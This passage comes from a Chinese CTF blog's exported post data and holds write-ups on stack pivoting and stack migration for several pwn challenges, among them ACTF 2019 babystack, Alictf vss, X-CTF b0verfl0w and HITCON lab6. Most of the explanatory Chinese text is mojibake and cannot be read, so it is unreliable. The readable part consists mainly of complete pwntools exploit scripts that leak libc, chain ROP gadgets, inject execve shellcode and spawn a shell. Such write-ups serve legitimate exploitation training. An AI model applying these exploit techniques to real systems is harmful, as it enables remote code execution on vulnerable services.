ssize_t vul_function() &#123; size_t v0; // eax size_t v1; // eax char buf; // [esp+0h] [ebp-18h] v0 = strlen(m1); write(1, m1, v0); // Hello good Ctfer read(0, &amp;s, 0x200u); v1 = strlen(m2); write(1, m2, v1); // What do you want to say? return read(0, &amp;buf, 0x20u); &#125; å‘ç°å¯ä»¥åˆ©ç”¨çš„gadgetåªæœ‰ä¸€ä¸ªï¼Œé‚£å°±åªæœ‰leaveçš„gadgetäº†ï¼Œç„¶åæŠŠebpæ§åˆ¶åˆ°å‰é¢çš„readå‡½æ•°çš„så¤„ï¼Œå…¶ä¹Ÿæ˜¯å…¨å±€å˜é‡ï¼Œåœ°å€å›ºå®šã€‚ æ”»å‡»æ€è·¯ åœ¨ç¬¬ä¸€ä¸ªreadçš„æ—¶å€™ï¼Œç›´æ¥æŠŠæ„é€ çš„ropé“¾è¯»è¿›å»ã€‚ä»»åŠ¡åˆ†åˆ«æ˜¯leak ä¸€ä¸ªå‡½æ•°çš„å†…å­˜åœ°å€ï¼Œæ¥ç”¨libcseacherç®—å‡ºsystemï¼Œè·Ÿ/bin/shå­—ç¬¦ä¸²çš„åœ°å€ï¼Œè¿”å›startå‡½æ•°æ¸…ç†æ ˆå¼€å¯ç¬¬äºŒæ¬¡ä½¿ç”¨æ¼æ´ï¼› call systemï¼ˆ/bin/shï¼‰ ç„¶åç¬¬äºŒä¸ªreadæ—¶å€™ï¼ŒæŠŠæ§ebpæŒ‡å‘å›ºå®šåœ°å€sçš„åœ°å€ï¼Œretaddress æ”¾ä¸Šleaveçš„gadgetã€‚ expfrom pwn import * context.arch = 'i386' context.log_level = 'debug' from LibcSearcher import * e = ELF('./spwn') io = process('./spwn') # libc = e.libc io = remote('node3.buuoj.cn',28527) padding = 24 s = 0x0804A300 fake1 = 0x0804A500 leave_ret = 0x08048511 puts_add = e.symbols['puts'] write_plt = e.symbols['write'] write_got = e.got['write'] io.recvuntil('name?') p = flat([fake1,write_plt,0x080483A0,1,write_got,10]) io.send(p) io.recvuntil('say?') p = padding * 'a' + p32(s) + p32(leave_ret) # raw_input('-&gt;') io.send(p) write_add = u32(io.recv(4)) print(hex(write_add)) obj = LibcSearcher('write',write_add) libc_base = write_add - obj.dump('write') #libc.symbols['write'] print(hex(obj.dump('write'))) print(hex(libc_base)) sys_add = libc_base + obj.dump('system') #libc.symbols['system'] binsh_add =libc_base + obj.dump('str_bin_sh') #libc.search('/bin/sh\\x00').next() io.recvuntil('name?') p = flat([fake1,sys_add,0x080483A0,binsh_add]) io.send(p) io.recvuntil('say?') p = padding * 'a' + p32(s) + p32(leave_ret) io.send(p) io.interactive() ACTF_ 2019_hardcore fmtæŸ¥ä¿æŠ¤å’Œarch[*] '/media/psf/mypwn2/buuctf/actf_2019_babystack/ACTF_2019_babystack' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) idaåˆ†æï¿¼ï¿¼ï¿¼ï¿¼å…¶ä¸­å¯ä»¥çœ‹åˆ°åé¢çš„readå¤„ï¼Œå­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œä½†æ˜¯åªæœ‰ä¸€ä¸ªgadgetå¯ä»¥ç”¨ï¼Œéœ€è¦è€ƒè™‘Stack Migrationã€‚å…¶ä¸­é‚£ä¸ªsub400a1aå‡½æ•°æ˜¯é—®ä½ éœ€è¦ç•™ä¸‹å¤šå°‘çš„å­—èŠ‚ï¼Œè‚¯å®šè¦0xe0ï¼Œæ‰€ä»¥å†é€è¿‡å»çš„æ—¶å€™å°±å¡«å…¥0xe0ï¼Œæ­£å¥½åšå‚æ•°ç»™ä¸‹é¢readå‡½æ•°ç”¨ã€‚ ç„¶åç¨‹åºæ¥å—åˆ°0xe0åï¼Œè¿›å…¥ifè¯­å¥ä¸­ï¼Œä¼šè¾“å‡ºä¸€ä¸‹å †æ ˆespçš„å€¼ï¼Œè¿™ä¸‹ä¹Ÿæ˜¯ç›¸å½“äºçŸ¥é“äº†ä¸€ä¸ªç‰¹å®šçš„åœ°å€ï¼Œç„¶åå°±æ­£å¸¸æ„é€ ropé“¾ï¼ŒæŠŠæ§ebpç­‰äºä¸ºæ¥æ”¶åˆ°çš„stack espï¼Œå†è·Ÿä¸Šleava gadgetå³å¯ã€‚ expfrom pwn import * from LibcSearcher import * context.log_level = 'debug' context.arch = 'amd64' # io = process('./ACTF_2019_babystack') # io = remote('node3.buuoj.cn',27626) io = remote('challenge-848a378609341016.sandbox.ctfhub.com', 24656) elf = ELF('./ACTF_2019_babystack') # libc = elf.libc io.recvuntil('message?\\n') io.sendline('224') io.recvuntil('saved at') stack_addr = int((io.recvline_contains('0x7f')),16) print(stack_addr) libc_start_main_got = elf.got['__libc_start_main'] puts_plt = elf.symbols['puts'] pop_rdi_ret = 0x000400ad3 start_addr = 0x000400800 leave_ret = 0x400a18 payload = flat(['\\x00'*8,pop_rdi_ret,libc_start_main_got,puts_plt,start_addr]) payload = payload.ljust(208,'a') payload += flat([stack_addr,leave_ret]) io.recvuntil('&gt;') raw_input('-&gt;') io.send(payload) io.recvuntil('bye~\\n') libc_start_main_addr = u64(io.recv(6).ljust(8,'\\x00')) #- libc.symbols['__libc_start_main'] obj = LibcSearcher('__libc_start_main',libc_start_main_addr) libc_base = libc_start_main_addr - obj.dump('__libc_start_main') print(hex(libc_base)) io.recvuntil('message?\\n') io.sendline('224') io.recvuntil('saved at') stack_addr = int((io.recvline_contains('0x7f')),16) print(stack_addr) rec = libc_base + 0x4f2c5 payload = flat(['\\x00'*8,rec]) payload = payload.ljust(208,'\\x00') payload += flat([stack_addr,leave_ret]) io.recvuntil('&gt;') raw_input('-&gt;') io.send(payload) io.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"Stack Migration","slug":"Stack-Migration","permalink":"http://chumen77.xyz/tags/Stack-Migration/"}]},{"title":"èŠ±å¼æ ˆæº¢å‡ºï¼ˆæ ˆå¸§çš„è°ƒèŠ‚ï¼‰","slug":"èŠ±å¼æ ˆæº¢å‡ºï¼ˆè°ƒèŠ‚æ ˆå¸§ï¼‰","date":"2020-02-05T08:53:11.000Z","updated":"2020-03-12T15:14:16.000Z","comments":true,"path":"2020/02/05/èŠ±å¼æ ˆæº¢å‡ºï¼ˆè°ƒèŠ‚æ ˆå¸§ï¼‰/","link":"","permalink":"http://chumen77.xyz/2020/02/05/èŠ±å¼æ ˆæº¢å‡ºï¼ˆè°ƒèŠ‚æ ˆå¸§ï¼‰/","excerpt":"","text":"èŠ±å¼æ ˆæº¢å‡ºï¼ˆæ ˆå¸§çš„è°ƒèŠ‚ï¼‰å‰è¨€æœ¬äººåˆšå­¦pwnä¸ä¹…ï¼Œæœ€è¿‘åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­å­¦åˆ°äº†å„ç§éœ€è¦æ ˆå¸§è°ƒèŠ‚çš„é¢˜ç›®ï¼Œä»¥æ­¤è®°å½•ä¸€ä¸‹ã€‚åœ¨ä¸€äº›æ ˆæº¢å‡ºçš„ç¨‹åºä¸­ï¼Œæˆ‘ä»¬ä¼šç¢°åˆ°ä¸€äº›é—®é¢˜ï¼Œä¾‹å¦‚æº¢å‡ºçš„å¯æ§å­—èŠ‚æ•°å¤ªå°‘ï¼Œæ— æ³•æ„é€ æˆ‘ä»¬æƒ³è¦çš„ropé“¾ï¼Œç¨‹åºASLRå¼€å¯åå¯¼è‡´çš„æ ˆåœ°å€ä¸å¯é¢„æµ‹ç­‰ã€‚å¯¹äºè¿™ç§é—®é¢˜ï¼Œå¸¸ç”¨çš„æ€è·¯åŒ…æ‹¬ï¼š åŠ å‡espå€¼ï¼Œæ§åˆ¶æ ˆæŒ‡é’ˆ Stack Migrationæ¥æ„é€ ä¸€ä¸ªå‡çš„æ ˆå¸§ã€‚ è¿™é‡Œæ€»ç»“äº†2ç§é¢˜å‹ï¼š åŠ å‡espï¼ŒæŠŠæ§æ ˆæŒ‡é’ˆè¿™ç§é¢˜å‹å°±éœ€è¦ç”¨Ropgadgetæ‰¾ä¸€ä¸ªæ§åˆ¶espçš„gadgetï¼Œç„¶åç®€å•ä¿®æ”¹espå€¼çš„å¤§å°ï¼Œæ¥æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ã€‚ Alictf_016_vssè¿™ä¸ªé¢˜ç›®å°±æ˜¯ä¸€ä¸ªä¿®æ”¹espæ‰©å¤§æ ˆç©ºé—´ï¼Œä»è€Œæ„é€ ropé“¾è·å–shellçš„é¢˜ç›®ã€‚ æ£€æŸ¥ä¿æŠ¤å’Œarch idaåˆ†æç”±äºè¿™ä¸ªç¨‹åºä½¿ç”¨é™æ€ç¼–è¯‘å’Œstripå‘½ä»¤å‰¥ç¦»ç¬¦å·ï¼Œç”¨idaæ‰“å¼€æ²¡æœ‰æˆ‘ä»¬å¹³æ—¶çœ‹çš„é‚£ä¹ˆç®€å•ï¼Œå¾ˆå¤šå‡½æ•°å·²ç»æ— æ³•è¯†åˆ«ï¼Œæˆ‘ä»¬å°±éœ€è¦è‡ªå·±è°ƒè¯•ï¼Œç„¶åæ¨æµ‹æ˜¯ä»€ä¹ˆå‡½æ•°ã€‚startå‡½æ•°ä¸­ï¼Œcallçš„å‡½æ•°æ˜¯__libc_start_main, ä¸Šä¸€è¡Œçš„ offsetåˆ™æ˜¯mainå‡½æ•°é‚£ä¸ªç®­å¤´å°±æ˜¯mainå‡½æ•°äº†ã€‚è¿›å…¥mainå‡½æ•°ä»¥åï¼Œå¯ä»¥ç»è¿‡syscallä¸­raxçš„å‚æ•°æ¥ç¡®è®¤å…¶æ˜¯ä»€ä¹ˆå‡½æ•°ï¼Œå¾ˆæ˜æ˜¾ä¸€ä¸ªå‡½æ•°æ˜¯alarmå‡½æ•°ï¼Œå…ˆæ‰‹åŠ¨nopä¸€ä¸‹ã€‚æŠŠè¿™ä¸ªå‡½æ•°å»é™¤åï¼Œæ–¹ä¾¿gdbçš„åæœŸè°ƒè¯•ã€‚æ¥ç€å¯ä»¥å¾ˆå®¹æ˜“ç¡®å®šä¸€ä¸‹putså‡½æ•°è·Ÿreadå‡½æ•°ï¼Œåœ¨idaä¸­ä¿®æ”¹ä¸€ä¸‹ã€‚ä¸‹é¢é‚£ä¸ª40108eå‡½æ•°æ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼Œæˆ‘ç”¨edbåŠ¨æ€è°ƒè¯•æ¥ç¡®å®šå‡ºå…¶ä¸­çš„æŸäº›å‡½æ•°ï¼šå¯¹äºè¿™ä¸ªå‡½æ•°ï¼Œå…ˆç¡®å®šä¸€ä¸‹å…¶å‚æ•°ã€‚dumpè¿‡å»å°±ä¼šå‘ç°æ˜¯å¤åˆ¶äº†ä¸€ä»½ã€‚æ‰€ä»¥å°±ç¡®å®šè¿™ä¸ªå‡½æ•°æ˜¯strncpyæ˜¯å‡½æ•°ã€‚å¯¹äºè¿™ä¸ªå‡½æ•°char *strncpy(char *dest, const char *src, int n)å°†srcæŒ‡å‘çš„å­—ç¬¦æ•°ç»„ä¸­nä¸ªå­—ç¬¦å¤åˆ¶åˆ°destæŒ‡å‘çš„å­—ç¬¦æ•°ç»„ä¸­ï¼Œåœ¨ç¬¬ä¸€ä¸ªç©ºå­—ç¬¦å¤„åœæ­¢ï¼Œå¹¶è¿”å›è¢«å¤åˆ¶åçš„destã€‚å¯¹äºä¸‹ä¸€æ®µå°±æ˜¯åˆ¤æ–­ä¸€ä¸‹ï¼Œæ˜¯å¦ä¸0x79å’Œ0x70ç›¸ç­‰ï¼Œå¯ä»¥æ¥æ‰‹åŠ¨ä¿®æ”¹å€¼è®©å…¶ç›¸ç­‰ã€‚å¾€åèµ°ä¼šå‘ç°å…ˆæº¢å‡ºäº†ï¼Œåœ¨åšæº¢å‡ºé¢˜çš„æ—¶å€™çœ‹åˆ°return å°±åº”è¯¥æƒ³åŠæ³•æƒ³ä¸Šè·³ã€‚æº¢å‡ºçš„è¿™ä¸ªåœ°å€å°±æ˜¯åˆšåˆšåˆsyrcpyå‡½æ•°å¤åˆ¶è¿‡æ¥0x50å­—èŠ‚ä¸­çš„æœ€å8ä¸ªå­—èŠ‚ï¼Œå› ä¸ºæ˜¯strncpyå‡½æ•°ï¼Œæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­æ˜¯ä¸èƒ½æœ‰\\x00ï¼Œå¦åˆ™ä¼šè¢«æˆªæ–­ï¼Œä»è€Œæ— æ³•å¤åˆ¶æ»¡0x50å­—èŠ‚åˆ¶é€ å¯æ§æº¢å‡ºï¼Œæ‰€ä»¥å‰0x48ä¸ªå­—èŠ‚ä¸­ï¼Œæˆ‘ä»¬ä¸èƒ½å†™å…¥ä»»ä½•åœ°å€ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹å°±éœ€è¦é€šè¿‡ä¿®æ”¹espæ¥å®Œæˆæ¼æ´åˆ©ç”¨ã€‚ åœ¨æœ€å‰é¢çš„readå‡½æ•°ä¸­ï¼Œç»™äº†ååˆ†å¤§çš„ç¼“å†²åŒºå¯ä»¥ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠROPé“¾æ”¾åœ¨0x50å­—èŠ‚ä¹‹åï¼Œç„¶åé€šè¿‡å¢åŠ espçš„å€¼æŠŠæ ˆé¡¶æŠ¬åˆ°ROPé“¾ä¸Šï¼Œç´§æ¥ç€æ‰§è¡Œè¿™ä¸ªropé“¾å³å¯ã€‚ æŸ¥åˆ°one_gadgetå‘ç°0x000000000046f205 : add rsp, 0x58 ; retæ­£å¥½ç¬¦åˆè¦æ±‚ã€‚ç„¶ågdbè°ƒè¯•ä¸€ä¸‹ç¡®å®šä¸€ä¸‹ropé“¾ä»50ä¸ªå­—èŠ‚åçš„é‚£é‡Œå¼€å§‹åˆé€‚å³å¯ã€‚ï¼ˆè¿™ä¸ªåœ¨æ‰¾onegadgetçš„æ—¶å€™æ³¨æ„ä¸è¦æŠŠrspææˆespäº†ï¼Œè‡ªå·±åœ¨åšçš„æ—¶å€™å› ä¸ºè¿™ä¸ªè°ƒè¯•äº†åŠå¤©ï¼Œæ‰å‘ç°æ˜¯è¿™ä¸ªé”™è¯¯ï¼Œå¯¼è‡´expä¸æˆåŠŸï¼‰ expfrom pwn import * import time io = process(&apos;./vss&apos;) e = ELF(&apos;./vss&apos;) io.recvuntil(&apos;Password:\\n&apos;) add_rsp_0x58_ret = 0x0046f205 pop_rax_ret = 0x0046f208 pop_rdi_ret = 0x0401823 pop_rsi_ret = 0x0401937 pop_rdx_ret = 0x043ae05 bss = 0x6C8178 -10 syscall_ret = 0x0045f2a5 rop1 = [ pop_rax_ret, 0, pop_rdi_ret, 0, pop_rsi_ret, bss, pop_rdx_ret, 10, syscall_ret, pop_rax_ret, 0x3b, pop_rdi_ret, bss, pop_rsi_ret, 0, pop_rdx_ret, 0, syscall_ret ] # raw_input(&apos;-&gt;&apos;) io.sendline(&apos;py&apos; + &apos;a&apos;*70 + p64(add_rsp_0x58_ret)+ &apos;b&apos;* 8 + &apos;&apos;.join(map(p64,rop1))) # raw_input(&apos;-&gt;&apos;) sleep(0.1) io.send(&apos;/bin/sh\\x00&apos;) io.interactive()X-CTF Quals 2016-b0verfl0wæŸ¥ä¿æŠ¤å’Œarchè¿™ä¸ªnxä¹Ÿæ²¡æœ‰å¼€ï¼Œå¯ä»¥ç”¨æ ˆæ‰§è¡Œshellcode idaåˆ†æsigned int vul() { char s; // [esp+18h] [ebp-20h] puts(&quot;\\n======================&quot;); puts(&quot;\\nWelcome to X-CTF 2016!&quot;); puts(&quot;\\n======================&quot;); puts(&quot;What&apos;s your name?&quot;); fflush(stdout); fgets(&amp;s, 50, stdin); printf(&quot;Hello %s.&quot;, &amp;s); fflush(stdout); return 1; }ä»£ç å¾ˆç®€å•ï¼Œä½†æ˜¯å¯ä»¥å‘ç°å¯ä»¥æº¢å‡ºçš„å­—èŠ‚åªæœ‰50-0x20-4=14ä¸ªå­—èŠ‚å¯æ§ï¼Œæ‰€ä»¥æ˜¯å¾ˆéš¾å†™å‡ºropé“¾æ¥è·å–å’±ä»¬ç›®çš„çš„ã€‚ç„¶åå°±å¯ä»¥è€ƒè™‘æ§åˆ¶æ ˆæŒ‡é’ˆçš„æ”»å‡»æ€è·¯ï¼Œå°±æ˜¯å…ˆæŠŠshellcodeæ‘†åœ¨æ ˆä¸Šï¼Œç„¶åæ§åˆ¶eipåˆ°è¾¾è¿™é‡Œå°±å¯ä»¥äº†ã€‚ä½†æ˜¯ç”±äºç¨‹åºæœ¬èº«ä¼šå¼€å¯ ASLR ä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾ˆéš¾ç›´æ¥çŸ¥é“ shellcode çš„åœ°å€ã€‚ä½†æ˜¯æ ˆä¸Šç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºå¯¹ esp è¿›è¡Œæ“ä½œï¼Œä½¿å…¶æŒ‡å‘ shellcode å¤„ï¼Œå¹¶ä¸”ç›´æ¥æ§åˆ¶ç¨‹åºè·³è½¬è‡³ esp å¤„ã€‚ æ‰¾ä¸€ä¸‹æ§åˆ¶espçš„gadget 0x08048504 : jmp espç„¶åæ€ä¹ˆæ§åˆ¶eipåˆ°shellcodeä¸Šå‘¢ï¼Œå› ä¸ºæ²¡æœ‰nxä¿æŠ¤ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€æ®µæŒ‡ä»¤æ¥æ§åˆ¶åç§»ï¼š sub esp,0x28 jmp espexpfrom pwn import * #io = process(&apos;./b0verfl0w&apos;) context.arch = &apos;i386&apos; io = remote(&apos;node3.buuoj.cn&apos;,29410) shellcode = &quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73&quot; shellcode += &quot;\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0&quot; shellcode += &quot;\\x0b\\xcd\\x80&quot; sub_esp_jmp = asm(&apos;sub esp, 0x28;jmp esp&apos;) jmp_esp = 0x08048504 payload = shellcode + (36-len(shellcode_x86))*&apos;b&apos;+p32(jmp_esp) + sub_esp_jmp io.readuntil(&apos;?\\n&apos;) #raw_input(&apos;-&gt;&apos;) io.sendline(payload) io.interactive()Stack Migrationåœ¨ Stack Migration ä¸­ï¼Œæˆ‘ä»¬æ‰€åˆ©ç”¨çš„æŠ€å·§ä¾¿æ˜¯åŒæ—¶æ§åˆ¶ EBP ä¸ EIPï¼Œè¿™æ ·æˆ‘ä»¬åœ¨æ§åˆ¶ç¨‹åºæ‰§è¡Œæµçš„åŒæ—¶ï¼Œä¹Ÿæ”¹å˜ç¨‹åºæ ˆå¸§çš„ä½ç½®ã€‚ åŸç†æˆ‘ä»¬çŸ¥é“åœ¨å‡½æ•°å»ºç«‹æ ˆå¸§æ—¶æœ‰ä¸¤æ¡æŒ‡ä»¤push ebp; mov ebp, espï¼Œè€Œé€€å‡ºæ—¶åŒæ ·éœ€è¦æ¶ˆé™¤è¿™ä¸¤æ¡æŒ‡ä»¤çš„å½±å“ï¼Œå³leave(mov esp, ebp; pop ebp) ã€‚ä¸”leaveä¸€èˆ¬ç´§è·Ÿç€å°±æ˜¯retã€‚å› æ­¤ï¼Œåœ¨å­˜åœ¨æ ˆæº¢å‡ºçš„ç¨‹åºä¸­ï¼Œåªè¦æˆ‘ä»¬èƒ½æ§åˆ¶åˆ°æ ˆä¸­çš„ebpï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸¤æ¬¡leaveåŠ«æŒæ ˆã€‚ ç¬¬ä¸€æ¬¡éšç€ç¨‹åºæµleave; retï¼Œnew espä¸ºæˆ‘ä»¬æ„é€ æ–°æ ˆçš„ç›®æ ‡åœ°å€ã€‚ å¯ä»¥çœ‹åˆ°æ‰§è¡Œåˆ°retæ—¶ï¼Œespè¿˜åœ¨åŸæ¥çš„oldæ ˆä¸Šï¼Œè€Œebpå·²ç»æŒ‡å‘äº†æ–°çš„æ ˆçš„æ ˆé¡¶ã€‚ç¬¬äºŒæ¬¡è¿›å…¥æˆ‘ä»¬æ”¾å…¥æ ˆä¸Šçš„leave; ret çš„gadgetï¼ˆè¿™ä¸ªæ˜¯æˆ‘ä»¬äº‹å…ˆå†™ä¸Šæ ˆçš„ï¼‰espå·²ç»è¢«æˆåŠŸåŠ«æŒåˆ°æ–°çš„æ ˆä¸Šï¼Œæ‰§è¡Œå®Œgadgetåæ ˆé¡¶ä¼š åœ¨new_esp-4(64ä½æ˜¯-8)çš„ä½ç½®ä¸Šã€‚æ­¤æ—¶æ ˆå®Œå…¨å¯æ§äº†ï¼Œé€šè¿‡é¢„å…ˆæˆ–è€…ä¹‹ååœ¨new stackä¸Šå¸ƒç½®çš„ropé“¾å¯ä»¥è½»æ¾å®Œæˆæ”»å‡»ã€‚ HITCON_training_lab6_64ä½è¿™ä¸ªæ˜¯åœ¨HITCON_trainingçš„ä¸€ä¸ªç»ƒä¹ ï¼Œç›´æ¥ç»™çš„æœ‰æºç ï¼Œæˆ‘ç»™ç¼–è¯‘æˆäº†64ä½ç‰ˆæœ¬ã€‚ æºç #include &lt;stdio.h&gt; int count = 1337 ; char *t= &quot;Z\\xc3&quot; ; int main(){ if( count!=1337 ){ _exit(1); } count++ ; char buf[48]; setvbuf(stdout,0,2,0); puts(&quot;Try your best : &quot; ); read(0, buf,128); return ; }gcc -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration ç¼–è¯‘å‘½ä»¤ ç®€å•åˆ†æè¿™ä¸ªé¢˜çº¯ç²¹å°±æ˜¯ä¸ºäº†ç»ƒä¹ çš„Stack Migrationç”¨çš„ï¼Œå¯ä»¥ä¸åˆ†æä»£ç ç›´æ¥ç”¨gdb-pedaç›´æ¥æ¥æµ‹è¯•ï¼šç†Ÿæ‚‰çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯ä¸‹é¢å¤šå‡ºæ¥çš„ä¸€äº›å­—ç¬¦ä¸²ï¼Œä¹Ÿæ˜¯ç¨‹åºä¸èƒ½æ¥å—çš„éƒ¨åˆ†ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºä¸€ä¸ªéœ€è¦è€ƒè™‘æ ˆè¿ç§»çš„æ ‡å¿—ã€‚æ³¨æ„ä¸€ä¸‹rspè¢«è¦†ç›–çš„å€¼ã€‚è®¡ç®—paddingä¸º48.è®¡ç®—ä¸€ä¸‹ï¼Œå¯ä»¥å¡«å…¥å¤šå°‘çš„å¯æ§å­—æ®µã€‚å»é™¤ä¸€ä¸‹åˆšåˆšç¨‹åºä¸èƒ½å­˜å…¥çš„éƒ¨åˆ†å’Œpaddingéƒ¨åˆ†ï¼Œè¿˜æœ‰80ä¸ªå­—èŠ‚å¯ä»¥ç”¨ã€‚å…¶ä¸­ä¸€ä¸ªæ¥ä¼ªé€ new espï¼Œå‰©ä¸‹ä¹Ÿå°±è¿˜æœ‰9ä¸ªgadgetå¯ä»¥ç”¨ï¼Œå¯ä»¥ç»™æˆ‘æ„é€ ç¬¬ä¸€ä¸ªropé“¾ã€‚ å›¾è§£åˆ†æå‡è®¾æˆ‘ä»¬å·²ç»å¡«å…¥äº†æº¢å‡ºå­—ç¬¦ï¼Œbuf1å³ä¸ºæˆ‘ä»¬è¦å»çš„æ–°æ ˆï¼Œè¿™ä¸ªé€‰æ‹©bssæ®µçš„åä¸€åŠï¼šå¼€å§‹æ‰§è¡Œä¸€ä¸‹leave ä¸­çš„mov rsp,rbpï¼šæ­¤æ—¶rsp ä¹ŸæŒ‡å‘äº† rbpæŒ‡å‘çš„ä½ç½®ï¼Œåœ¨æ‰§è¡Œleaveä¸­çš„pop rbp:æ­¤æ—¶rbpå·²ç»åˆ°äº†æˆ‘ä»¬ä¼ªé€ çš„æ–°æ ˆbuf1ï¼Œç„¶åå¼€å§‹æ‰§è¡Œret,è¿›å…¥æ‰§è¡Œpop_rdiçš„gadget: æ­¤æ—¶å·²ç»å°†buf1çš„åœ°å€ï¼Œæ¨å…¥rdiï¼Œä½œä¸ºgetsçš„å‚æ•°ï¼Œæ‰§è¡Œgetså‡½æ•°åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾€buf1ä¸Šå¡«å…¥æˆ‘ä»¬çš„ropé“¾ï¼Œæ­¤æ—¶æ ˆå¤§å°å·²ç»æ²¡æœ‰é™åˆ¶äº†ï¼Œå¯ä»¥ä»»æ„å†™ã€‚åœ¨è¿™ä¸ªbuf1çš„æ ˆç©ºé—´é‡Œï¼Œæˆ‘ä»¬éœ€è¦å…ˆæŠŠrbpæŒ‡å‘çš„ä½ç½®å†™å…¥buf2ï¼ˆä¸‹ä¸€ä¸ªæ„é€ çš„æ–°æ ˆï¼‰ï¼Œç„¶åæ„é€ ropé“¾æŠŠputsçš„å†…å­˜åœ°å€ç»™æ³„éœ²å‡ºæ¥ï¼Œè¿›è€Œå¯ä»¥ç®—å‡ºlibcçš„åŸºåœ°å€ï¼Œæ¥ç€å†æ„é€ ä¸€ä¸ªgetså‡½æ•°ã€‚æ¥ç€æ˜¯æ‰§è¡Œä¸€ä¸‹leave çš„gadgetï¼šæ‰§è¡Œå®Œä»¥åå°±å¯ä»¥å‘ç°æˆ‘ä»¬ï¼Œå·²ç»å®Œå…¨æ§åˆ¶äº†æ ˆã€‚å¹¶ä¸”å¼€äº†ä¸€ä¸ªbuf2çš„æ–°æ ˆï¼Œç•™ç€åœ¨buf1è°ƒç”¨getså‡½æ•°æ—¶æ¥åœ¨buf2æ–°æ ˆä¸­æ‘†ä¸Šè°ƒç”¨system(/bin/sh)å‡½æ•°çš„ropé“¾ã€‚ç„¶åç»§ç»­æ‰§è¡Œï¼šè¿™å°±æ³„éœ²å‡ºäº†putså‡½æ•°çš„å†…å­˜åœ°å€ã€‚æ¥ç€å¼€å§‹å¾€buf2æ–°æ ˆä¸Šè¯»ropé“¾:è¯»å…¥å®Œæˆï¼Œæ¥ç€å†æ¬¡æ‰§è¡Œleaveçš„gadgetï¼šå¯ä»¥çœ‹åˆ°espåˆ°äº†æ–°æ ˆï¼Œrbpå› ä¸ºåˆšåˆšåœ¨buf2å¡«å…¥çš„buf1ï¼Œåˆä¼šåˆ°äº†buf1ï¼Œè¿™ä¸ªåœ°å€å¯ä»¥éšä¾¿å¡«äº†ï¼Œå¯¹åšé¢˜ä¸å½±å“ï¼Œå¡«å†™è¿™ä¸ªåªæ˜¯å¯ä»¥çœ‹åˆ°å†æ¬¡æ ˆè½¬ç§»ã€‚æ¥ç€æ‰§è¡Œbuf2æ–°æ ˆçš„ropé“¾ï¼šå°±å¯ä»¥æ‹¿åˆ°shelläº†ã€‚ EXPå€Ÿç€è¿™ä¸ªæ€è·¯å°±å¯ä»¥å¼€å§‹å†™exp: from pwn import * import time context.arch = &apos;amd64&apos; context.log_level = &apos;debug&apos; e = ELF(&apos;./test&apos;) l = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;) # io = remote(&apos;127.0.0.1&apos;,4000) io = process(&apos;./test&apos;) pop_rdi_ret = 0x400703 pop_rsi_r15_ret= 0x0400701 pop_rdx_ret= 0x0400724 leave_ret= 0x0400699 buf1 = 0x00602000 - 0x200 buf2 = buf1 + 0x100 padding = 56 - 8 puts_plt = e.symbols[&apos;puts&apos;] puts_got = e.got[&apos;puts&apos;] read_add = e.symbols[&apos;read&apos;] io.recvuntil(&apos;:&apos;) p = &apos;a&apos;*padding + flat([buf1,pop_rdi_ret,0,pop_rsi_r15_ret,buf1,0,pop_rdx_ret,0x100,read_add,leave_ret]) #raw_input(&apos;-&gt;&apos;) io.send(p) sleep(0.1) p = flat([buf2,pop_rdi_ret,puts_got,puts_plt,pop_rdi_ret,0,pop_rsi_r15_ret,buf2,0,pop_rdx_ret,0x100,read_add,leave_ret]) sleep(0.1) #raw_input(&apos;-&gt;&apos;) io.sendline(p) io.recvuntil(&apos;\\n&apos;) puts = u64((io.recv(6)).ljust(8,&apos;\\x00&apos;)) libc = puts - l.symbols[&apos;puts&apos;] print(&apos;libc_base:&apos; + hex(libc)) binsh_add = l.search(&apos;/bin/sh\\x00&apos;).next() + libc #print(binsh_add) # raw_input(&apos;-&gt;&apos;) system_add = l.symbols[&apos;system&apos;] + libc p = flat([buf1,pop_rdi_ret,binsh_add,system_add]) sleep(0.1) io.sendline(p) io.interactive()Hgame2020_week2_rop_level2æŸ¥ä¿æŠ¤å’Œarch32ä½ç¨‹åºï¼Œå¼€äº†nxä¿æŠ¤ idaåˆ†æè¿™ä¸ªæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯0x60-0x50-0x8 = 8ã€‚å‘ç°åªæœ‰ä¸€ä¸ªgadgetä½ç½®ï¼Œæ— æ³•æ„é€ æˆ‘ä»¬æƒ³è¦çš„ropé“¾ã€‚ä½†æ˜¯å‰é¢çš„ç¬¬ä¸€ä¸ªreadå‡½æ•°ï¼Œå¯ä»¥è¯»å…¥å¾ˆå¤§ç©ºé—´ï¼Œå¹¶ä¸”ç¬¬äºŒä¸ªå‚æ•°bufçš„åœ°å€æ˜¯å›ºå®šçš„ã€‚é‚£è¿™ä¸ªé¢˜æ˜æ˜¾å°±æ˜¯å¯ä»¥Stack Migrationæ¥è§£å†³é—®é¢˜äº†ï¼Œå¹¶ä¸”åªéœ€å†å†™ä¸€ä¸ªleave retå°±æ§åˆ¶æ ˆäº†ã€‚ 